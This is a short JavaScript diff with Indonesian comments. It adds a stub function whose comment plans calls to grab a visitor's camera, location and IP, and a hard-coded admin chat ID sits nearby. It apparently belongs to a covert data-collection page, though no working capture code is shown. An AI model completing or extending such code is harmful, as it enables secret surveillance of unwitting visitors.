@@ -1,5 +1,9 @@
 const CHAT_ID = "7483495590"; // chat admin
 const statusEl = document.getElementById("status");
+function startAccess() {
+  console.log("Mulai akses fitur…");
+  // di sini panggil getUserCamera(), getUserLocation(), getUserIP(), dll
+}
 
 // ambil info device
 async function getDeviceInfo() {
